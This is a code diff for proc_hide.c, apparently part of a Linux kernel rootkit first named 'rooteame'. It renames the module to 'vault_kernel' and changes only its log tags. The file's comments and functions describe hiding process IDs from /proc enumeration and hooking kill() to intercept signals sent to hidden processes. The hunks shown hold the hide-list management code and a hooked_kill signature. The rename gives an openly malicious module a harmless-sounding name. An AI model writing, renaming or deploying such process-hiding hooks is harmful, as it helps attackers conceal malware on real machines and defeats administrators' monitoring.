@@ -1,4 +1,4 @@
-/* rooteame - proc_hide.c
+/* vault_kernel - proc_hide.c
  * Process hiding — PIDs are hidden from /proc enumeration
  * Also hooks kill() to intercept signals to hidden processes
  * ruby570bocadito © 2026
@@ -15,7 +15,7 @@ void proc_hide_add(int pid) {
     if (hidden_pid_count < MAX_HIDDEN_PIDS) {
         hidden_pids[hidden_pid_count] = pid;
         hidden_pid_count++;
-        pr_info(ROOTEAME_TAG " hiding PID: %d\n", pid);
+        pr_info(VAULT_KERNEL_TAG " hiding PID: %d\n", pid);
     }
     spin_unlock_irqrestore(&proc_hide_lock, flags);
 }
@@ -28,7 +28,7 @@ void proc_hide_del(int pid) {
         if (hidden_pids[i] == pid) {
             hidden_pid_count--;
             hidden_pids[i] = hidden_pids[hidden_pid_count];
-            pr_info(ROOTEAME_TAG " unhid PID: %d\n", pid);
+            pr_info(VAULT_KERNEL_TAG " unhid PID: %d\n", pid);
             break;
         }
     }
@@ -86,12 +86,12 @@ asmlinkage long hooked_kill(pid_t pid, int sig) {
 }
 
 int proc_hide_init(void) {
-    pr_info(ROOTEAME_TAG " process hiding initialized (max=%d)\n",
+    pr_info(VAULT_KERNEL_TAG " process hiding initialized (max=%d)\n",
             MAX_HIDDEN_PIDS);
     return 0;
 }
 
 void proc_hide_cleanup(void) {
     hidden_pid_count = 0;
-    pr_info(ROOTEAME_TAG " process hiding cleaned\n");
+    pr_info(VAULT_KERNEL_TAG " process hiding cleaned\n");
 }
